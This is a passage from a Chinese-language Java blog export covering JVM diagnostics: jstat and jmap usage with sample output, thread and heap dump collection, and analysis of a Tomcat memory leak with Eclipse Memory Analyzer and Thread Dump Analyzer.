<p>总结：</p>
<p>【不要在构造器里调用可能被重载的虚方法，这是极度危险的】。</p>
<p>构造器的初始化顺序大概是:</p>
<ol>
<li>父类静态块</li>
<li>子类静态块</li>
<li>父类初始化语句</li>
<li>父类构造函器</li>
<li>子类初始化语句</li>
<li>子类构造器</li>
</ol>
<p>父类构造器执行的时候，调用了子类的重载方法，然而子类的类字段还在刚初始化的阶段，刚完成内存布局，只能输出null。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】bin目录监控常用命令</title>
    <url>/blog/plang/java/analyzer/binjktools/</url>
    <content><![CDATA[<p>Java的安装包自带了很多优秀的工具，善用这些工具对于监控和调试Java程序非常有帮助。常用工具如下：</p>
<h2 id="jps"><a href="#jps" class="headerlink" title="jps "></a>jps </h2><p>用途：jps用来查看JVM里面所有进程的具体状态, 包括进程ID，进程启动的路径等等。</p>
<p>常用参数：</p>
<p>-l: 输出完成的包名称；</p>
<p>-m: 输出程序的命令行输入参数；</p>
<p>-v: 输出完整的JVM参数。</p>
<h2 id="jstack"><a href="#jstack" class="headerlink" title="jstack "></a>jstack </h2><p>用途：1）查看java程序崩溃生成core文件，获得core文件的java stack和native stack的信息；2）查看正在运行的java程序的java stack和native stack的信息：a)<br>查看运行的java程序呈现hung的状态；b) 跟踪Java的调用栈，剖析程序。</p>
<h2 id="jinfo"><a href="#jinfo" class="headerlink" title="jinfo"></a>jinfo</h2><p>用途：jinfo可观察运行中的java程序的运行环境参数：参数包括Java System属性和JVM命令行参数；也可从core文件里面知道崩溃的Java应用程序的配置信息。</p>
<h2 id="jstat"><a href="#jstat" class="headerlink" title="jstat "></a>jstat </h2><p><strong>用途</strong>：jstat利用了JVM内建的指令对Java应用程序的资源和性能进行实时的命令行的监控，包括了对Heap size和垃圾回收状况的监控等等。</p>
<p><strong>语法结构：</strong></p>
<pre><code>Usage: jstat -help|-options
</code></pre>
<p>       jstat -&lt;option&gt; [-t] [-h&lt;lines&gt;] &lt;vmid&gt; [&lt;interval&gt; [&lt;count&gt;]]</p>
<p><strong>参数解释：</strong></p>
<p>Options — 选项，我们一般使用 -gcutil 查看gc情况</p>
<p>vmid    — VM的进程号，即当前运行的java进程号</p>
<p>interval– 间隔时间，单位为秒或者毫秒</p>
<p>count   — 打印次数，如果缺省则打印无数次</p>
<p><strong>具体option参数如下：</strong></p>
<p>-class：统计class loader行为信息</p>
<p>-compile：统计编译行为信息</p>
<p>-gc：统计jdk gc时heap信息</p>
<p>-gccapacity：统计不同的generations（不知道怎么翻译好，包括新生区，老年区，permanent区）相应的heap容量情况</p>
<p>-gccause：统计gc的情况，（同-gcutil）和引起gc的事件</p>
<p>-gcnew：统计gc时，新生代的情况</p>
<p>-gcnewcapacity：统计gc时，新生代heap容量</p>
<p>-gcold：统计gc时，老年区的情况</p>
<p>-gcoldcapacity：统计gc时，老年区heap容量</p>
<p>-gcpermcapacity：统计gc时，permanent区heap容量</p>
<p>-gcutil：统计gc时，heap情况</p>
<p><strong>输出内容含义如下：</strong></p>
<p>S0  — Heap上的 Survivor space 0 区已使用空间的百分比</p>
<p>S1  — Heap上的 Survivor space 1 区已使用空间的百分比</p>
<p>E   — Heap上的 Eden space 区已使用空间的百分比</p>
<p>O   — Heap上的 Old space 区已使用空间的百分比</p>
<p>P   — Perm space 区已使用空间的百分比</p>
<p>YGC — 从应用程序启动到采样时发生 Young GC 的次数</p>
<p>YGCT– 从应用程序启动到采样时 Young GC 所用的时间(单位秒)</p>
<p>FGC — 从应用程序启动到采样时发生 Full GC 的次数</p>
<p>FGCT– 从应用程序启动到采样时 Full GC 所用的时间(单位秒)</p>
<p>GCT — 从应用程序启动到采样时用于垃圾回收的总时间(单位秒) </p>
<p><strong>示例</strong></p>
<p>实例使用1：</p>
<p>[root@localhost bin]# jstat -gcutil 25444</p>
<p>  S0     S1     E      O      P     YGC     YGCT    FGC    FGCT     GCT</p>
<p> 11.63   0.00   56.46  66.92  98.49 162    0.248    6      0.331    0.579 </p>
<p>实例使用2：</p>
<p>[root@localhost bin]# jstat -gcutil 25444 1000 5</p>
<p>  S0     S1     E      O      P     YGC     YGCT    FGC    FGCT     GCT</p>
<p> 73.54   0.00  99.04  67.52  98.49    166    0.252     6    0.331    0.583</p>
<p> 73.54   0.00  99.04  67.52  98.49    166    0.252     6    0.331    0.583</p>
<p> 73.54   0.00  99.04  67.52  98.49    166    0.252     6    0.331    0.583</p>
<p> 73.54   0.00  99.04  67.52  98.49    166    0.252     6    0.331    0.583</p>
<p> 73.54   0.00  99.04  67.52  98.49    166    0.252     6    0.331    0.583 </p>
<p>我们可以看到，5次young gc之后，垃圾内存被从Eden space区(E)放入了Old space区(O)，并引起了百分比的变化，导致Survivor space使用的百分比从73.54%(S0)降到0%(S1)。有效释放了内存空间。绿框中，我们可以看到，一次full gc之后，Old space区(O)的内存被回收，从99.05%降到67.52%。</p>
<p>图中同时打印了young gc和full gc的总次数、总耗时。而，每次young gc消耗的时间，可以用相间隔的两行YGCT相减得到。每次full gc消耗的时间，可以用相隔的两行FGCT相减得到。例如红框中表示的第一行、第二行之间发生了1次young gc，消耗的时间为0.252-0.252＝0.0秒。</p>
<p>常驻内存区(P)的使用率，始终停留在98.49%左右，说明常驻内存没有突变，比较正常。</p>
<p>如果young gc和full gc能够正常发生，而且都能有效回收内存，常驻内存区变化不明显，则说明java内存释放情况正常，垃圾回收及时，java内存泄露的几率就会大大降低。但也不能说明一定没有内存泄露。</p>
<p>GCT 是YGCT 和FGCT的时间总和。</p>
<p>以上，介绍了Jstat按百分比查看gc情况的功能。其实，它还有功能，例如加载类信息统计功能、内存池信息统计功能等，那些是以绝对值的形式打印出来的，比较少用，在此就不做介绍。 </p>
<p>[root@localhost bin]# ps -ef | grep java</p>
<p>root     25917     1  2 23:23 pts&#x2F;2    00:00:05 &#x2F;usr&#x2F;local&#x2F;jdk1.5&#x2F;bin&#x2F;java -Djava.endorsed.dirs&#x3D;&#x2F;usr&#x2F;local&#x2F;jakarta-tomcat-5.0.30&#x2F;common&#x2F;endorsed -classpath &#x2F;usr&#x2F;local&#x2F;jdk1.5&#x2F;lib&#x2F;tools.jar:&#x2F;usr&#x2F;local&#x2F;jakarta-tomcat-5.0.30&#x2F;bin&#x2F;bootstrap.jar:&#x2F;usr&#x2F;local&#x2F;jakarta-tomcat-5.0.30&#x2F;bin&#x2F;commons-logging-api.jar -Dcatalina.base&#x3D;&#x2F;usr&#x2F;local&#x2F;jakarta-tomcat-5.0.30 -Dcatalina.home&#x3D;&#x2F;usr&#x2F;local&#x2F;jakarta-tomcat-5.0.30 -Djava.io.tmpdir&#x3D;&#x2F;usr&#x2F;local&#x2F;jakarta-tomcat-5.0.30&#x2F;temp org.apache.catalina.startup.Bootstrap start</p>
<p><strong>jstat -class pid:显示加载class的数量，及所占空间等信息。</strong></p>
<p>实例使用3：</p>
<p>[root@localhost bin]# jstat -class 25917</p>
<p>Loaded  Bytes  Unloaded  Bytes     Time</p>
<p>2629    2916.8       29   24.6     0.90 </p>
<p><strong>jstat -compiler pid:显示VM实时编译的数量等信息。</strong></p>
<p>实例使用4：</p>
<p>[root@localhost bin]# jstat -compiler 25917</p>
<p>Compiled Failed Invalid   Time   FailedType FailedMethod</p>
<p>     768      0       0   0.70            0 </p>
<p><strong>jstat –gccapacity :可以显示，VM内存中三代（young,old,perm）对象的使用和占用大小</strong>，如：PGCMN显示的是最小perm的内存使用量，PGCMX显示的是perm的内存最大使用量，PGC是当前新生成的perm内存占用量，PC是但前perm内存占用量。其他的可以根据这个类推， OC是old内纯的占用量。 </p>
<p>[root@localhost bin]# jstat -gccapacity 25917</p>
<p>NGCMN       640.0</p>
<p>NGCMX       4992.0</p>
<p>NGC         832.0</p>
<p>S0C         64.0</p>
<p>S1C         64.0</p>
<p>EC          704.0</p>
<p>OGCMN       1408.0</p>
<p>OGCMX       60544.0</p>
<p>OGC         9504.0</p>
<p>OC          9504.0                  OC是old内纯的占用量</p>
<p>PGCMN       8192.0                  PGCMN显示的是最小perm的内存使用量</p>
<p>PGCMX       65536.0                 PGCMX显示的是perm的内存最大使用量</p>
<p>PGC         12800.0                 PGC是当前新生成的perm内存占用量</p>
<p>PC          12800.0                 PC是但前perm内存占用量</p>
<p>YGC         164</p>
<p>FGC         6 </p>
<p><strong>jstat -gcnew pid: new对象的信息</strong></p>
<p>[root@localhost bin]# jstat -gcnew 25917</p>
<p> S0C    S1C    S0U    S1U   TT MTT  DSS      EC       EU     YGC     YGCT</p>
<p> 64.0   64.0   47.4   0.0   2  15   32.0    704.0    145.7    168    0.254 </p>
<p><strong>jstat -gcnewcapacity pid: new对象的信息及其占用量</strong></p>
<p>[root@localhost bin]# jstat -gcnewcapacity 25917</p>
<p> NGCMN  NGCMX   NGC   S0CMX  S0C   S1CMX  S1C   ECMX    EC      YGC   FGC</p>
<p>640.0  4992.0  832.0 64.0   448.0 448.0  64.0   4096.0  704.0  168     6</p>
<p><strong>jstat -gcold pid: old对象的信息。</strong></p>
<p>[root@localhost bin]# jstat -gcold 25917</p>
<p>   PC       PU        OC          OU       YGC    FGC    FGCT     GCT</p>
<p> 12800.0  12617.6     9504.0      6561.3   169     6    0.335    0.591</p>
<p><strong>jstat -gcoldcapacity pid:old对象的信息及其占用量。</strong></p>
<p>[root@localhost bin]# jstat -gcoldcapacity 25917</p>
<p>OGCMN      OGCMX        OGC         OC       YGC   FGC    FGCT     GCT</p>
<p>1408.0     60544.0      9504.0      9504.0   169     6    0.335    0.591 </p>
<p><strong>jstat -gcpermcapacity pid: perm对象的信息及其占用量。</strong></p>
<p>[root@localhost bin]# jstat -gcpermcapacity 25917</p>
<p>PGCMN      PGCMX       PGC         PC      YGC   FGC    FGCT     GCT</p>
<p>8192.0    65536.0    12800.0    12800.0   169     6    0.335    0.591 </p>
<p><strong>jstat -printcompilation pid:当前VM执行的信息。</strong></p>
<p>[root@localhost bin]# jstat -printcompilation -h3  25917 1000 5</p>
<p>每1000毫秒打印一次，一共打印5次，还可以加上-h3每三行显示一下标题。</p>
<p>Compiled  Size  Type Method</p>
<p>     788     73    1 java&#x2F;io&#x2F;File &lt;init&gt;</p>
<p>     788     73    1 java&#x2F;io&#x2F;File &lt;init&gt;</p>
<p>     788     73    1 java&#x2F;io&#x2F;File &lt;init&gt;</p>
<p>Compiled  Size  Type Method</p>
<p>     788     73    1 java&#x2F;io&#x2F;File &lt;init&gt;</p>
<p>     788     73    1 java&#x2F;io&#x2F;File &lt;init&gt;</p>
<h2 id="jmap"><a href="#jmap" class="headerlink" title="jmap"></a>jmap</h2><p><strong>用途</strong>：观察运行中的jvm物理内存的占用情况，包括Heap size, Perm size等等。</p>
<p><strong>参数如下：</strong></p>
<p>-heap：打印jvm heap的情况</p>
<p>-histo：打印jvm heap的直方图。其输出信息包括类名，对象数量，对象占用大小。</p>
<p>-histo：live ：同上，但是只答应存活对象的情况</p>
<p>-permstat：打印permanent generation heap情况</p>
<p><strong>命令使用：</strong></p>
<p>jmap -heap 2083<br>---- 观察到New Generation（Eden Space，From Space，To Space）,tenured generation,Perm Generation的内存使用情况</p>
<p>jmap -histo 2083 ｜ jmap -histo:live 2083  <br>---- 观察heap中所有对象的情况（heap中所有生存的对象的情况）。包括对象数量和所占空间大小。</p>
<p>jmap -dump:live,format&#x3D;b,file&#x3D;heap.bin 2083 ---- dump java heap in<br>hprof binary format。输出文件可用于进一步分析。</p>
<p>class name对应的就是Class文件里的class的标识<br>B代表byte<br>C代表char<br>D代表double<br>F代表float<br>I代表int<br>J代表long<br>Z代表boolean<br>前边有[代表数组，[I 就相当于int[]<br>对象用[L+类名表示</p>
<p> </p>
<hr>
<p>  <em>BaseType</em> ** Character**   <strong>Type</strong>    <strong>Interpretation</strong><br>  B                           byte        signed byte<br>  C                           char        Unicode character<br>  D                           double      double-precision floating-point value<br>  F                           float       single-precision floating-point value<br>  I                           int         integer<br>  J                           long        long integer<br>  L&lt;classname&gt;;             reference   an instance of class de&gt;&lt;classname&gt;de&gt;<br>  S                           short       signed short<br>  Z                           boolean     de&gt;truede&gt; or de&gt;falsede&gt;<br>  <strong>[</strong>                      reference   one array dimension</p>
<hr>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】获取线程和堆信息</title>
    <url>/blog/plang/java/analyzer/getthreadheap/</url>
    <content><![CDATA[<p>JAVA性能分析的基础是获取线程和堆的信息，本文介绍了常用的获取这两种信息的方法。</p>
<h2 id="如何获得线程信息"><a href="#如何获得线程信息" class="headerlink" title="如何获得线程信息"></a>如何获得线程信息</h2><p>下以命令都是jdk的bin目录里自带的命令。</p>
<p>通过jps获得对应的进程名，然后通过jstack输出线程信息</p>
<p><img src="/images/janalyzer/jps.gif"><img src="/images/janalyzer/jstack.gif"></p>
<p>直接通过jvisualvm导出线程信息</p>
<p><img src="/images/janalyzer/jvmthread.gif"><img src="/images/janalyzer/jvmheapsaveas.gif"></p>
<h2 id="如何获得堆转储"><a href="#如何获得堆转储" class="headerlink" title="如何获得堆转储"></a>如何获得堆转储</h2><p>通过jps获得对应的进程名，然后通过jmap输出</p>
<p><img src="/images/janalyzer/jmap.gif"></p>
<p>通过jvisualvm直接做堆转储</p>
<p><img src="/images/janalyzer/jvmthreadsaveas.gif"></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】使用Eclipse Memory Analyzer分析Tomcat内存溢出</title>
    <url>/blog/plang/java/analyzer/matuse/</url>
    <content><![CDATA[<p>本文用MAT(Eclipse Memory Analyzer)分析Tomcat内存溢出原因。</p>
<p>关于如何获取JAVA堆日志可以参考<a href="/plang/java/analyzer/getthreadheap.php">获取JAVA线程和堆信息</a></p>
<h2 id="MAT安装与介绍"><a href="#MAT安装与介绍" class="headerlink" title="MAT安装与介绍"></a>MAT安装与介绍</h2><p>下载地址：<a href="http://www.eclipse.org/mat/downloads.php%E3%80%82">http://www.eclipse.org/mat/downloads.php。</a></p>
<p>通过MAT打开dump出来的内存文件，打开后如下图：</p>
<p><img src="/images/janalyzer/matindex.png"></p>
<p>从上图可以看到它的大部分功能。</p>
<ul>
<li>Histogram可以列出内存中的对象，对象的个数以及大小。</li>
<li>Dominator Tree可以列出那个线程，以及线程下面的那些对象占用的空间。</li>
<li>Top consumers通过图形列出最大的object。</li>
<li>Leak Suspects通过MA自动分析泄漏的原因。</li>
</ul>
<h2 id="Histogram界面"><a href="#Histogram界面" class="headerlink" title="Histogram界面"></a>Histogram界面</h2><p>Objects:类的对象的数量。</p>
<p>Shallow<br>size：就是对象本身占用内存的大小，不包含对其他对象的引用，也就是对象头加成员变量（不是成员变量的值）的总和。</p>
<p>Retained size：是该对象自己的shallow<br>size，加上从该对象能直接或间接访问到对象的shallow<br>size之和。换句话说，retained size是该对象被GC之后所能回收到内存的总和。</p>
<p>我们发现ThreadLocal和bingo.persister.dao.Daos类的对象占用了很多空间。</p>
<p><img src="/images/janalyzer/mathistogram.png"></p>
<h2 id="Dominator-Tree界面"><a href="#Dominator-Tree界面" class="headerlink" title="Dominator Tree界面"></a>Dominator Tree界面</h2><p>我们发现quartz的定时器的工作线程（10个）占了很多的内存空间</p>
<p><img src="/images/janalyzer/matdominator.png"></p>
<h2 id="Top-consumers界面"><a href="#Top-consumers界面" class="headerlink" title="Top consumers界面"></a>Top consumers界面</h2><p>这里显示了内存中最大的对象有哪些，他们对应的类是哪些，类加载器classloader是哪些。</p>
<p>有些时候，我们在这里就可以看到代码泄露的位置。</p>
<p><img src="/images/janalyzer/matconsumers.png"></p>
<h2 id="Leak-Suspects界面"><a href="#Leak-Suspects界面" class="headerlink" title="Leak Suspects界面"></a>Leak Suspects界面</h2><p>从那个饼图，该图深色区域被怀疑有内存泄漏，可以发现整个heap才250M内存，深色区域就占了34%。后面的描述，告诉我们quartz线程占用了大量内存，并指出system<br>class<br>loader加载的&quot;java.lang.ThreadLocal&quot;实例的内存中聚集（消耗空间），并建议用关键字&quot;java.lang.ThreadLocal$ThreadLocalMap$Entry[]&quot;进行检查。所以，MAT通过简单的报告就说明了问题所在。</p>
<p><img src="/images/janalyzer/matsuspects.png"></p>
<p>通过Leak Suspects的Problem Suspect 1点击【Details<br>?】，如下图如下图所示的上下文菜单中选择 List objects -&gt; with outgoning<br>references, 查看ThreadLocal都应用了些什么对象。</p>
<p><img src="/images/janalyzer/matsuspects2.png"></p>
<p>现在看到ThreadLocal中引用的对象如下图：是dao对象</p>
<p><img src="/images/janalyzer/matdao.png"></p>
<p>下面继续查看dao的gc ROOT,如下图所示的上下文菜单中选择 Path To GC Roots<br>-&gt; exclude weak references,<br>过滤掉弱引用，因为在这里弱引用不是引起问题的关键。</p>
<p><img src="/images/janalyzer/matdao2.png"></p>
<p>从下图中，可以看到在org.quartz.simpl.SimpleThreadPool中保存了daos的引用。所以可以得出是是因为定时器在运行的过程中持有大量的Daos对象应起了内存泄露。为什么会有那么多的Daos呢,Daos不是一个无状态的单例的、可以重用的吗？继续查看spring配置文件发现Daos的bean配置成scope&#x3D;&quot;prototype&quot;，导致定时任务又是每次调用都生产新的Daos实例。由于是Daos是无状态的，修改为单例的，问题解决。</p>
<p><img src="/images/janalyzer/matdao3.png"></p>
<p>以上是通过MAT分析Tomcat应用程序，找到内存泄露的原因，并解决。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】线程日志分析之TDA</title>
    <url>/blog/plang/java/analyzer/dtatools/</url>
    <content><![CDATA[<h2 id="java-thread-日志分析工具"><a href="#java-thread-日志分析工具" class="headerlink" title="java thread 日志分析工具"></a>java thread 日志分析工具</h2><p>这里用的是tda(Thread Dump Analyzer)，可以到网上下载到，是个免费的软件。</p>
<p>这个软件可以分析导出的java线程日志，至于如何获取java线程日志，可以看”<a href="%E8%8E%B7%E5%8F%96JAVA%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%A0%86%E4%BF%A1%E6%81%AF">获取JAVA线程和堆信息</a>“。</p>
<p><img src="/images/janalyzer/tda.gif">\</p>
<h2 id="各种JAVA线程状态的说明"><a href="#各种JAVA线程状态的说明" class="headerlink" title="各种JAVA线程状态的说明"></a>各种JAVA线程状态的说明</h2><p>先看一下线程的各种状态的状态图：</p>
<p><img src="/images/janalyzer/threadstat.gif">\</p>
<p><img src="/"></p>
<p>下面是日志里线程状态的一些解释。</p>
<h2 id="waiting-for-monitor-entry"><a href="#waiting-for-monitor-entry" class="headerlink" title="waiting for monitor entry"></a>waiting for monitor entry</h2><p>意味着它 在等待进入一个临界区 ，所以它在”Entry<br>Set”队列中等待。此时线程状态一般都是 Blocked</p>
<p>如果大量线程在 “waiting for monitor entry”：</p>
<p>可能是一个全局锁阻塞住了大量线程。</p>
<p>如果短时间内打印的 thread dump 文件反映，随着时间流逝，waiting for<br>monitor entry 的线程越来越多，没有减少的趋势，可能意味着<br>某些线程在临界区里呆的时间太长了，以至于越来越多新线程迟迟无法进入临界区。</p>
<p>java.lang.Thread.State: BLOCKED (on object monitor)</p>
<h2 id="waiting-on-condition"><a href="#waiting-on-condition" class="headerlink" title="waiting on condition"></a>waiting on condition</h2><p>说明它<br>在等待另一个条件的发生，来把自己唤醒，或者干脆它是调用了sleep(N)。此时线程状态大致为以下几种</p>
<p>java.lang.Thread.State: WAITING (parking)：一直等那个条件发生；</p>
<p>java.lang.Thread.State: TIMED_WAITING<br>(parking或sleeping)：定时的，那个条件不到来，也将定时唤醒自己。</p>
<p>如果大量线程在 “ waiting on condition “：</p>
<p>可能是它们又跑去获取第三方资源，<br>尤其是第三方网络资源，迟迟获取不到Response，导致大量线程进入等待状态。</p>
<p>所以如果你发现有大量的线程都处在 Wait on<br>condition，从线程堆栈看，正等待网络读写<br>，这可能是一个网络瓶颈的征兆，因为网络阻塞导致线程无法执行。</p>
<h2 id="in-Object-wait"><a href="#in-Object-wait" class="headerlink" title="in Object.wait()"></a>in Object.wait()</h2><p>说明它 获得了监视器之后，又调用了 java.lang.Object.wait() 方法。</p>
<p>每个 Monitor在某个时刻，只能被一个线程拥有，该线程就是 “Active<br>Thread”，而其它线程都是 “Waiting Thread”，分别在两个队列 “ Entry Set”和<br>“Wait Set”里面等候。在 “Entry Set”中等待的线程状态是 “Waiting for<br>monitor entry”，而在 “Wait Set”中等待的线程状态是 “in Object.wait()”。</p>
<p>当线程获得了<br>Monitor，如果发现线程继续运行的条件没有满足，它则调用对象（一般就是被<br>synchronized 的对象）的 wait() 方法，放弃了 Monitor，进入 “Wait<br>Set”队列。此时线程状态大致为以下几种：</p>
<p>java.lang.Thread.State: TIMED_WAITING (on object monitor)；</p>
<p>java.lang.Thread.State: WAITING (on object monitor)；</p>
<h2 id="示范一"><a href="#示范一" class="headerlink" title="示范一"></a>示范一</h2><p>下面这个线程在等待这个锁 0x00000000fe7e3b50，等待进入临界区：</p>
<pre><code>&quot;RMI TCP Connection(64896)-172.16.52.118&quot; daemon prio=10 tid=0x00000000405a6000 nid=0x68fe waiting for monitor entry [0x00007f2be65a3000]
   java.lang.Thread.State: BLOCKED (on object monitor)
at com.xyz.goods.service.impl.GoodsServiceImpl. findChanellGoodsCountWithCache(GoodsServiceImpl.java:1734)
-  waiting to lock &lt;0x00000000fe7e3b50&gt; (a java.lang.String)
</code></pre>
<p>那么谁持有这个锁呢？</p>
<p>是另一个先调用了 findChanellGoodsCountWithCache 函数的线程：</p>
<pre><code>&quot;RMI TCP Connection(64878)-172.16.52.117&quot; daemon prio=10 tid=0x0000000040822000 nid=0x6841 runnable [0x00007f2be76b3000]
   java.lang.Thread.State: RUNNABLE
at java.net.SocketInputStream.socketRead0(Native Method)
at java.net.SocketInputStream.read(SocketInputStream.java:129)
at java.io.BufferedInputStream.fill(BufferedInputStream.java:218)
at java.io.BufferedInputStream.read1(BufferedInputStream.java:258)
at java.io.BufferedInputStream.read(BufferedInputStream.java:317)
- locked &lt;0x00000000af4ed638&gt; (a java.io.BufferedInputStream)
at org.bson.io.Bits.readFully(Bits.java:35)
at org.bson.io.Bits.readFully(Bits.java:28)
at com.mongodb.Response.(Response.java:35)
at com.mongodb.DBPort.go(DBPort.java:110)
- locked &lt;0x00000000af442d48&gt; (a com.mongodb.DBPort)
at com.mongodb.DBPort.go(DBPort.java:75)
- locked &lt;0x00000000af442d48&gt; (a com.mongodb.DBPort)
at com.mongodb.DBPort.call(DBPort.java:65)
at com.mongodb.DBTCPConnector.call(DBTCPConnector.java:202)
at com.mongodb.DBApiLayer$MyCollection.__find(DBApiLayer.java:296)
at com.mongodb.DB.command(DB.java:152)
at com.mongodb.DBCollection.getCount(DBCollection.java:760)
at com.mongodb.DBCollection.getCount(DBCollection.java:731)
at com.mongodb.DBCollection.count(DBCollection.java:697)
at com.xyz.goods.manager.MongodbManager.count(MongodbManager.java:202)
at com.xyz.goods.service.impl.GoodsServiceImpl.findChanellGoodsCount(GoodsServiceImpl.java:1787)
at com.xyz.goods.service.impl.GoodsServiceImpl. findChanellGoodsCountWithCache(GoodsServiceImpl.java:1739)
-  locked &lt;0x00000000fe7e3b50&gt; (a java.lang.String)
</code></pre>
<h2 id="示范二"><a href="#示范二" class="headerlink" title="示范二"></a>示范二</h2><p>等待另一个条件发生来将自己唤醒：</p>
<pre><code>&quot;RMI TCP Connection(idle)&quot; daemon prio=10 tid=0x00007fd50834e800 nid=0x56b2  waiting on condition [0x00007fd4f1a59000]
   java.lang.Thread.State:  TIMED_WAITING (parking)
at sun.misc.Unsafe.park(Native Method)
-  parking to wait for  &lt;0x00000000acd84de8&gt; (a java.util.concurrent.SynchronousQueue$TransferStack)
at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:198)
at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(SynchronousQueue.java:424)
at java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:323)
at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:874)
at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:945)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)
at java.lang.Thread.run(Thread.java:662)
</code></pre>
<p>&quot;TIMED_WAITING (parking)&quot;中的 timed_waiting<br>指等待状态，但这里指定了时间，到达指定的时间后自动退出等待状态；parking指线程处于挂起中。</p>
<p>&quot;waiting on condition&quot;需要与堆栈中的&quot;parking to wait for<br>&lt;0x00000000acd84de8&gt; (a<br>java.util.concurrent.SynchronousQueue$TransferStack)&quot;<br>结合来看。首先，本线程肯定是在等待某个条件的发生，来把自己唤醒。其次，SynchronousQueue<br>并不是一个队列，只是线程之间移交信息的机制，当我们把一个元素放入到<br>SynchronousQueue<br>中时必须有另一个线程正在等待接受移交的任务，因此这就是本线程在等待的条件。</p>
<p>示范三</p>
<pre><code>&quot;RMI RenewClean-[172.16.50.182:4888]&quot; daemon prio=10 tid=0x0000000040d2c800 nid=0x97e  in Object.wait() [0x00007f9ccafd0000]
   java.lang.Thread.State:  TIMED_WAITING (on object monitor)
at java.lang.Object.wait(Native Method)
- waiting on &lt;0x0000000799b032d8&gt; (a java.lang.ref.ReferenceQueue$Lock)
at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:118)
- locked &lt;0x0000000799b032d8&gt; (a java.lang.ref.ReferenceQueue$Lock)
at sun.rmi.transport.DGCClient$EndpointEntry$RenewCleanThread.run(DGCClient.java:516)
at java.lang.Thread.run(Thread.java:662)
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】使用 Eclipse Memory Analyzer 进行堆转储文件分析</title>
    <url>/blog/plang/java/analyzer/matuse2/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述 "></a>概述 </h2><p>对于大型 JAVA应用程序来说，再精细的测试也难以堵住所有的漏洞，即便我们在测试阶段进行了大量卓有成效的工作，很多问题还是会在生产环境下暴露出来，并且很难在测试环境中进行重现。JVM<br>能够记录下问题发生时系统的部分运行状态，并将其存储在堆转储 (Heap Dump)文件中，从而为我们分析和诊断问题提供了重要的依据。</p>
<p>通常内存泄露分析被认为是一件很有难度的工作，一般由团队中的资深人士进行。不过，今天我们要介绍的MAT（Eclipse Memory Analyzer）被认为是一个”傻瓜式”的堆转储文件分析工具，你只需要轻轻点击一下鼠标就可以生成一个专业的分析报告。和其他内存泄露分析工具相比，MAT的使用非常容易，基本可以实现一键到位，即使是新手也能够很快上手使用。</p>
<p>MAT的使用是如此容易，你是不是也很有兴趣来亲自感受下呢，那么第一步我们先来安装MAT。</p>
<h2 id="准备环境和测试数据"><a href="#准备环境和测试数据" class="headerlink" title="准备环境和测试数据 "></a>准备环境和测试数据 </h2><p>我们使用的是 Eclipse Memory Analyzer V0.8，Sun JDK 6</p>
<h3 id="安装-MAT"><a href="#安装-MAT" class="headerlink" title="安装 MAT"></a>安装 MAT</h3><p>和其他插件的安装非常类似，MAT支持两种安装方式，一种是”单机版”的，也就是说用户不必安装 Eclipse IDE环境，MAT 作为一个独立的 Eclipse RCP应用运行；另一种是”集成版”的，也就是说 MAT 也可以作为 Eclipse IDE的一部分，和现有的开发平台集成。</p>
<p>集成版的安装需要借助 Update Manager。</p>
<p>如图 1 所示，首先通过 Help -&gt; Software Updates...启动软件更新管理向导。</p>
<h5 id="图-1-安装插件第一步"><a href="#图-1-安装插件第一步" class="headerlink" title="图 1. 安装插件第一步"></a>图 1. 安装插件第一步</h5><p><img src="/images/janalyzer/image001.jpg" alt="图 1. 安装插件第一步">{width&#x3D;”282”}</p>
<p>选择”Available Software”然后按如图 2 所示的方式添加 MAT 的更新地址<br><a href="http://download.eclipse.org/technology/mat/0.8/update-site/">http://download.eclipse.org/technology/mat/0.8/update-site/</a>。</p>
<h5 id="图-2-安装插件第二步"><a href="#图-2-安装插件第二步" class="headerlink" title="图 2. 安装插件第二步"></a>图 2. 安装插件第二步</h5><p><img src="/images/janalyzer/image002.jpg" alt="图 2. 安装插件第二步">{width&#x3D;”576”}</p>
<p>如图 3 所示，接下来选择你想要安装的 MAT 的功能点，需要注意的是 Memory Analyzer (Chart)这个功能是一个可选的安装项目，它主要用来生成相关的报表，不过如果需要用到这个功能，你还需要额外的安装<br>BIRT Chart Engine。</p>
<h5 id="图-3-安装插件第三步"><a href="#图-3-安装插件第三步" class="headerlink" title="图 3. 安装插件第三步"></a>图 3. 安装插件第三步</h5><p><img src="/images/janalyzer/image003.jpg" alt="图 3. 安装插件第三步">{width&#x3D;”575”}</p>
<p>插件安装完毕，你还需要重新启动 Eclipse 的工作平台。</p>
<p>比较而言，单机版的安装方式非常简单，用户只需要下载相应的安装包，然后解压缩即可运行，这也是被普遍采用的一种安装方式。在下面的例子里，我们使用的也是单机版的<br>MAT。具体的下载要求和地址可参见其产品下载页面：<a href="http://www.eclipse.org/mat/downloads.php">http://www.eclipse.org/mat/downloads.php</a>。</p>
<p>另外，如果你需要用 MAT 来分析 IBM JVM 生成的 dump文件的话，还需要额外安装 IBM Diagnostic Tool Framework，具体的下载和安装配置步骤请参见：<a href="http://www.ibm.com/developerworks/java/jdk/tools/dtfj.html">http://www.ibm.com/developerworks/java/jdk/tools/dtfj.html</a></p>
